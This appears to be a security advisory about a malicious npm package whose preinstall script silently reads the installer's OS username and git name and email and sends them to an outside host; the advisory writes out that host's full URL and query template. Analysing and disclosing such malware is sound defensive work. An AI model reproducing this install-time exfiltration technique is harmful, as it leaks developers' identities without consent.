summary: preinstall script exfiltrates OS username and git identity to non-publisher server
details: The `preinstall` lifecycle script in `dist/scripts/preinstall.js` unconditionally harvests installer-side identity data during `npm install` and sends it to an attacker-configurable third-party host. Specifically, the script reads `os.userInfo().username`, parses `~/.gitconfig` with `iniparser` to pull `user.name` and `user.email`, and issues an HTTPS GET to `https://2tak.l.serverhost.name:1962/mobile/reext?osname=<username>&gitname=<name>&gitemail=<email>`. The exfiltration fires silently (errors swallowed) for every installer whose OS username is not the author's own (`xmarcgusmano`, which is routed to localhost), so all downstream consumers leak their git identity on install. The destination domain `2tak.l.serverhost.name` does not match the npm publisher's advertised infrastructure and is a dynamic-DNS-style hostname. The preinstall also writes package assets to `../../../public/<name>` outside the node_modules tree, but that behavior alone is aggressive-install rather than the primary block basis. The install-time telemetry beacon of identity data to a non-publisher host — without consent or disclosure — is the concrete installer-harm signal.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
